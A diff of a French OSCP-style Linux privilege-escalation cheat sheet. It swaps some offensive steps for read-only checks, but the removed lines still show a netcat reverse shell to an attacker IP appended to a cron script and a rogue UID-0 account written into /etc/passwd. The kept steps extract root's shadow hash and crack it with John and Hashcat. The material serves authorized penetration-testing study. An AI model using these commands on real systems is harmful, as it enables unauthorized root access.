@@ -251,29 +251,28 @@ sudo tcpdump -vv -i eth0 'not host 10.11.1.111'
 
 ## Tâches cron
 
-Examiner les permissions et la configuration de Linux.
+Examiner les tâches planifiées, leurs propriétaires et les scripts exécutés.
 
 <p class="oscp-command-note">Cron : rechercher les exécutions dans les journaux accessibles.</p>
 
 ```bash
-grep "CRON" /var/log/syslog
+grep -i 'cron' /var/log/syslog  # Debian/Ubuntu, si disponible
 # Autre possibilité
-cat /var/log/cron.log  # Fichier présent uniquement sur certaines distributions
+grep -i 'cron' /var/log/cron  # RHEL/CentOS, si disponible
 
 ```
 
 <p class="oscp-command-note">Cron : vérifier les droits du script exécuté par la tâche planifiée.</p>
 
 ```bash
-ls -lah /chemin/vers/script.sh
+ls -l /chemin/vers/script.sh
 
 ```
 
-<p class="oscp-command-note">Cron : vérifier d'abord les droits d'écriture sur le script planifié ; ne pas modifier un script sans autorisation.</p>
+<p class="oscp-command-note">Cron : vérifier si le script et ses répertoires parents sont modifiables.</p>
 
 ```bash
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
-
+namei -l /chemin/vers/script.sh
 ```
 
 <p class="oscp-command-note">Cron : afficher les tâches de l'utilisateur et examiner les répertoires de planification.</p>
@@ -281,22 +280,17 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [liste
 ```bash
 crontab -l
 ls -alh /var/spool/cron
-ls -al /etc/ | grep cron
 ls -al /etc/cron*
-cat /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-cat /etc/cron.allow
-cat /etc/cron.deny
+ls -l /etc/at.allow /etc/at.deny /etc/cron.allow /etc/cron.deny 2>/dev/null
 cat /etc/crontab
 cat /etc/anacrontab
-cat /var/spool/cron/crontabs/root
+sudo crontab -l -u root  # Uniquement si autorisé
 
 ```
 
-### /etc/passwd
+### Examiner les comptes locaux
 
-<p class="oscp-command-note">OpenSSL : générer un hash de mot de passe pour un compte Unix de laboratoire.</p>
+<p class="oscp-command-note">OpenSSL : générer interactivement un hash SHA-512 crypt pour un laboratoire.</p>
 
 ```bash
 openssl passwd -6
@@ -304,24 +298,23 @@ openssl passwd -6
 ```
 
 ```bash
-# Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
-echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
-
+# Examiner les comptes ayant un UID égal à 0 (lecture seule)
+awk -F: '$3 == 0 {print $1 ":" $3 ":" $7}' /etc/passwd
 ```
 
-<p class="oscp-command-note">Linux : vérifier l'UID et les groupes du compte de test après connexion.</p>
+<p class="oscp-command-note">Vérifier l'identité du compte courant après authentification.</p>
 
 ```bash
-su newroot
+su NOM_COMPTE
 
-# Vérifier l'accès racine
+# Afficher l'UID et les groupes
 id
 
 ```
 
-### /etc/shadow
+### Examiner les empreintes de /etc/shadow
 
-<p class="oscp-command-note">Shadow : extraire la ligne d'un compte autorisé (lecture généralement réservée à root).</p>
+<p class="oscp-command-note">Shadow : extraire la ligne root si l'accès privilégié est autorisé.</p>
 
 ```bash
 sudo grep '^root:' /etc/shadow > root_hash.txt
@@ -331,7 +324,7 @@ sudo grep '^root:' /etc/shadow > root_hash.txt
 <p class="oscp-command-note">John et Hashcat : tester hors ligne un hash sha512crypt (préfixe `$6$`).</p>
 
 ```bash
-# Avec John the Ripper
+# John the Ripper : tester l'empreinte extraite
 john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
 
 # Extraire uniquement le hash de la ligne shadow avant Hashcat
@@ -344,7 +337,7 @@ hashcat -m 1800 sha512crypt.hash /usr/share/wordlists/rockyou.txt
 # Avec John the Ripper
 john --show root_hash.txt
 
-# Hashcat
+# Hashcat : afficher les correspondances déjà trouvées
 hashcat -m 1800 sha512crypt.hash --show
 
 ```
@@ -829,15 +822,15 @@ strings <BINAIRE_SUID> | grep -Ei '(/bin/|/usr/|system|exec|sh )'
 
 ```
 
-<p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>
+<p class="oscp-command-note">Convertir le rapport LinPEAS avec les scripts `peas2json.py`, `json2html.py` et `json2pdf.py` s'ils sont installés.</p>
 
 ```bash
-# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.
+# Copier le rapport sur la machine d'analyse autorisée.
 
-# 2. Convert .txt to .json.
+# Convertir le texte en JSON.
 python3 peas2json.py ./linpeas_output.txt peass.json
 
-# 3. Convert .json to .html.
+# Convertir le JSON en HTML.
 python3 json2html.py peass.json peass.html
 
 # Facultatif : convertir également le rapport au format PDF.
@@ -864,9 +857,6 @@ python3 json2pdf.py peass.json peass.pdf
 
 ### Unix-privesc-check
 
-**Paramètres et repères :**
-`./unix-privesc-check.sh`  
-
 ```bash
 ./unix-privesc-check.sh | tee unix_privesc_check_output.txt
 
@@ -888,7 +878,7 @@ peepdf.py file.pdf
 
 ### Outil de recherche de vulnérabilités
 
-<p class="oscp-command-note">Exécuter exploit-suggester.py avec les paramètres indiqués pour «Outil de recherche de vulnérabilités».</p>
+<p class="oscp-command-note">Exécuter le script `exploit-suggester.py` uniquement s'il est présent et compatible avec Python 3.</p>
 
 ```bash
 python3 exploit-suggester.py
